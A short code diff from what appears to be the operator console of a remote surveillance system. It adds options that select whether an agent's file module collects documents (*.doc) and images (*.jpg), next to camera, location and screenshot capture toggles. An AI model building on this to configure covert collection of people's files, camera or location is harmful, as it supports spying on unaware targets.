@@ -12,7 +12,6 @@
     <![CDATA[
       import it.ht.rcs.console.network.controller.CollectorManager;
       import it.ht.rcs.console.network.model.Collector;
-      import it.ht.rcs.console.operations.view.configuration.ConfigurationView;
       
       import mx.collections.ListCollectionView;
       
@@ -30,6 +29,15 @@
         camera.selected     = hasLoop('CAMERA');
         position.selected   = hasLoop('POSITION');
         
+        var fileModule:Object = getModule('file');
+        if (file.selected) {
+          file.documents.selected = (fileModule.accept as Array).indexOf('*.doc') != -1;
+          file.images.selected = (fileModule.accept as Array).indexOf('*.jpg') != -1;
+        } else {
+          file.documents.selected = true;
+          file.images.selected = true;
+        }
+          
         if (screenshot.selected)
           screenshot.seconds.text = String(getDelayFor('SCREENSHOT'));
         
@@ -72,6 +80,14 @@
             return true;
         
         return false;
+      }
+      
+      private function getModule(module:String):Object
+      {
+        for each (var m:Object in config.modules)
+          if (m.module == module)
+            return m;
+        return null;
       }
       
       private function getDelayFor(desc:String):int
